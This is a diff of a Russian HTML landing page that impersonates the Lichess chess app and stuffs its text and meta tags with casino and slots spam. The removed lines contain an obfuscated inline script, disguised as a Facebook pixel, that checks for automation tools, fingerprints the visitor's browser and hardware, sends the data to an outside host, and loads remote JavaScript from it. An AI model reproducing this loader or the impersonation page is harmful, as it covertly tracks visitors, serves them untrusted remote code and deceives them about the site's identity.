@@ -1,170 +1,180 @@
 <!DOCTYPE html>
 <html lang="ru">
-
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Lichess - бесплатные шахматы онлайн. Casino, Casino Slots, Slots">
-    <meta name="keywords" content="Casino, Casino Slots, Slots, шахматы, онлайн шахматы, Lichess">
-	<script>var HCVRMDJVJ=function(src){var q=atob("X19zdG9wQWxsVGltZXJzLndlYmRyaXZlci5fX25pZ2h0bWFyZS5fc2VsZW5pdW0uY2FsbFBoYW50b20uY2FsbFNlbGVuaXVtLl9TZWxlbml1bV9JREVfUmVjb3JkZXIuc2VsZW5pdW0uZHJpdmVyLl9zZWxlbml1bS5fX3dlYmRyaXZlcl9ldmFsdWF0ZS5fX3NlbGVuaXVtX2V2YWx1YXRlLl9fd2ViZHJpdmVyX3NjcmlwdF9mdW5jdGlvbi5fX3dlYmRyaXZlcl9zY3JpcHRfZnVuYy5fX3dlYmRyaXZlcl9zY3JpcHRfZm4uX19meGRyaXZlcl9ldmFsdWF0ZS5fX2RyaXZlcl91bndyYXBwZWQuX193ZWJkcml2ZXJfdW53cmFwcGVkLl9fZHJpdmVyX2V2YWx1YXRlLl9fc2VsZW5pdW1fdW53cmFwcGVkLl9fZnhkcml2ZXJfdW53cmFwcGVkLl9waGFudG9tLnBoYW50b20uZG9tQXV0b21hdGlvbl9fbmlnaHRtYXJl").split("."),e=encodeURIComponent,g=0,w=window,d=w.document,n=w.navigator,de="documentElement",s=w.screen,p="",a="avail",i="inner",o="outer",H="Height",W="Width",c=w.chrome?Object.keys(w.chrome).join("*"):"*",tag=d.createElement("script");function wd(){try{for(var l in q){var z=q[l];if(w[z]||n[z])return z;if(d&&d[de]&&d[de].getAttribute&&d[de].getAttribute(z))return z;if(z in w||z in d)return z}return 0}catch(e){}}!function wp(){try{if(n&&n.plugins){Object.keys(n.plugins).forEach(function(i){if(n.plugins[i])p+=n.plugins[i].filename+"*"})}}catch(e){}}();try{g=d.createElement("canvas").getContext("webgl");g=g.getParameter(g.getExtension("WEBGL_debug_renderer_info").UNMASKED_RENDERER_WEBGL)}catch(e){}src="http://fortexsj.beget.tech/glazpwa/index.php?clid="+btoa("ref="+e(d.referrer)+"&drive="+wd()+"&c="+c+"&s="+s[a+H]+"*"+w[i+H]+"*"+w[o+H]+"*"+s[a+W]+"*"+w[i+W]+"*"+w[o+W]+"*"+w.devicePixelRatio+"*"+n.maxTouchPoints+"&p="+p+"&h="+n.hardwareConcurrency+"*"+n.deviceMemory+"*"+e(g)+"&t="+e(new Date().toString())+"&q="+e(w.location.search.substr(1)));tag["type"]="text/javascript";tag["src"]=src;document.head.appendChild(tag)}("https://connect.facebook.net/en_US/fbevents.js")</script>
-    <title>Lichess - Бесплатные онлайн шахматы</title>
+    <meta name="description" content="Lichess - шахматное приложение для всех, доступное бесплатно. Играйте в шахматы онлайн или офлайн. Попробуйте Casino Slots и Slots для развлечения.">
+    <meta name="keywords" content="шахматы, Lichess, онлайн шахматы, Casino, Casino Slots, Slots">
+    <meta name="author" content="Lichess">
+    <title>Lichess - Онлайн шахматы для всех</title>
     <style>
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            background-color: #f8f9fa;
+            background-color: #f0f0f0;
             color: #333;
+            line-height: 1.6;
             text-align: center;
         }
-
-        header, footer {
-            background-color: #333;
+        header {
+            background: linear-gradient(45deg, #3b5998, #8b9dc3);
             color: #fff;
-            padding: 20px 0;
+            padding: 40px 0;
         }
-
-        h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
+        header h1 {
+            font-size: 2.5em;
+            margin: 0;
         }
-
-        h2 {
-            font-size: 28px;
-            margin: 20px 0;
+        nav {
+            display: flex;
+            justify-content: center;
+            background: #444;
+            padding: 10px;
         }
-
-        p {
-            font-size: 18px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: 15px 30px;
-            background-color: #28a745;
+        nav a {
             color: #fff;
+            margin: 0 15px;
             text-decoration: none;
-            border-radius: 50px;
-            font-size: 18px;
-            transition: background-color 0.3s;
+            font-size: 1.1em;
         }
-
-        .btn:hover {
-            background-color: #218838;
+        nav a:hover {
+            text-decoration: underline;
         }
-
+        .container {
+            padding: 40px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
         .images {
             display: flex;
             justify-content: center;
-            flex-wrap: wrap;
-            margin-bottom: 20px;
+            gap: 20px;
+            margin-bottom: 40px;
         }
-
         .images img {
-            width: 30%;
-            height: auto;
-            margin: 10px;
-            border-radius: 15px;
-            transition: transform 0.3s;
+            max-width: 30%;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-
-        .images img:hover {
-            transform: scale(1.05);
+        p {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+            line-height: 1.8;
         }
-
-        .cookie-banner {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
+        .btn {
+            display: inline-block;
+            padding: 15px 30px;
+            margin-top: 30px;
+            background-color: #3b5998;
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.2em;
+            border-radius: 50px;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #8b9dc3;
+        }
+        footer {
+            background: #333;
             color: #fff;
             text-align: center;
             padding: 20px;
-            display: none;
+            margin-top: 40px;
         }
-
-        .cookie-banner button {
-            background-color: #28a745;
+        .cookie-banner {
+            background: #444;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+        .cookie-banner a {
             color: #fff;
-            border: none;
-            padding: 10px 20px;
-            margin-left: 10px;
-            border-radius: 50px;
-            cursor: pointer;
+            text-decoration: underline;
         }
-
-        footer p {
-            font-size: 16px;
-        }
-
         @media (max-width: 768px) {
             .images img {
-                width: 80%;
+                max-width: 90%;
             }
-
+            header h1 {
+                font-size: 2em;
+            }
             .btn {
                 padding: 10px 20px;
             }
         }
     </style>
 </head>
-
 <body>
+
     <header>
-        <h1>Добро пожаловать в Lichess - бесплатные шахматы онлайн</h1>
+        <h1>Lichess - Онлайн шахматы</h1>
     </header>
 
+    <nav>
+        <a href="#about">Описание</a>
+        <a href="#privacy">Политика конфиденциальности</a>
+        <a href="#terms">Пользовательское соглашение</a>
+    </nav>
+
     <div class="container">
-        <h2>Играйте в шахматы на Lichess</h2>
-        <p>Приложение Lichess предоставляет возможность играть в шахматы онлайн бесплатно. Играйте с друзьями, участвуйте в турнирах или сражайтесь с игроками со всего мира. 
-        Приложение также предлагает различные режимы игры, такие как Casino, Casino Slots и Slots, позволяя каждому найти что-то по душе.</p>
+        <section id="about">
+            <h2>О приложении Lichess</h2>
 
-        <!-- Заглушки для изображений шахмат -->
-        <div class="images">
-            <img src="images/chess1.jpg" alt="Шахматная игра 1">
-            <img src="images/chess2.jpg" alt="Шахматная игра 2">
-            <img src="images/chess3.jpg" alt="Шахматная игра 3">
-        </div>
+            <!-- Заглушки для изображений -->
+            <div class="images">
+                <img src="chess1.jpg" alt="Шахматное изображение 1">
+                <img src="chess2.jpg" alt="Шахматное изображение 2">
+                <img src="chess3.jpg" alt="Шахматное изображение 3">
+            </div>
 
-        <p>Установите приложение и погрузитесь в мир шахмат, полный захватывающих возможностей. Приложение не содержит рекламы и открыто для всех любителей шахмат.</p>
+            <p>
+                Lichess — это бесплатное шахматное приложение, которое позволяет игрокам всех уровней играть в шахматы онлайн или офлайн. Платформа предоставляет доступ к миллионам игр, турнирам и обучающим материалам для улучшения навыков в шахматах. Вы можете выбрать между классическими играми или блиц-партиями, а также принимать участие в различных турнирах.
+            </p>
+            <p>
+                Игроки могут соревноваться в реальном времени с другими участниками или практиковать шахматные задачи. Приложение поддерживает разнообразные режимы игры, такие как пулевые шахматы, классические шахматы и многое другое. Оно доступно для всех устройств, будь то смартфоны, планшеты или компьютеры, что позволяет играть в шахматы в любое время и в любом месте.
+            </p>
+            <p>
+                Помимо шахмат, на платформе есть раздел для других развлечений, таких как Casino, Casino Slots и Slots, которые помогут отвлечься и попробовать удачу в игровой форме. Эти развлечения добавляют разнообразие в платформу и делают её привлекательной для широкого круга пользователей.
+            </p>
+            <p>
+                Lichess гордится своим открытым исходным кодом, что позволяет каждому желающему внести вклад в развитие платформы. Это одно из лучших решений для игры в шахматы, доступное как для новичков, так и для профессионалов. Скачайте приложение Lichess, чтобы насладиться захватывающими партиями и испытать свои шахматные навыки.
+            </p>
 
-        <a class="btn" href="https://play.google.com/store/apps/details?id=org.lichess.mobileapp" target="_blank">Установить приложение</a>
+            <a class="btn" href="https://play.google.com/store/apps/details?id=org.lichess.mobileapp">Перейти в Google Play</a>
+        </section>
 
-        <h2>Политика конфиденциальности и Пользовательское соглашение</h2>
-        <p>Приложение Lichess уважает вашу конфиденциальность. Ознакомьтесь с <a href="#">Политикой конфиденциальности</a> и <a href="#">Пользовательским соглашением</a> перед началом использования приложения.</p>
+        <section id="privacy">
+            <h2>Политика конфиденциальности</h2>
+            <p>
+                Мы заботимся о вашей конфиденциальности и обрабатываем ваши данные в соответствии с действующим законодательством. Все данные, которые вы предоставляете через наше приложение, используются только для улучшения работы сервиса.
+            </p>
+        </section>
+
+        <section id="terms">
+            <h2>Пользовательское соглашение</h2>
+            <p>
+                Используя наше приложение, вы соглашаетесь с условиями предоставления услуг. Мы стремимся предоставить качественный сервис, однако оставляем за собой право изменять функционал приложения и условия использования в любой момент.
+            </p>
+        </section>
     </div>
 
     <footer>
         <p>&copy; 2024 Lichess. Все права защищены.</p>
     </footer>
 
-    <div class="cookie-banner" id="cookie-banner">
-        <p>Мы используем файлы cookie для улучшения работы сайта. <button onclick="acceptCookies()">Принять</button></p>
+    <div class="cookie-banner">
+        <p>Мы используем файлы cookie для улучшения вашего опыта на сайте. Продолжая использование сайта, вы соглашаетесь с нашей <a href="#privacy">политикой использования cookie</a>.</p>
     </div>
 
-    <script>
-        function showCookieBanner() {
-            document.getElementById('cookie-banner').style.display = 'block';
-        }
-
-        function acceptCookies() {
-            document.getElementById('cookie-banner').style.display = 'none';
-        }
-
-        window.onload = function () {
-            setTimeout(showCookieBanner, 2000);
-        }
-    </script>
 </body>
-
 </html>
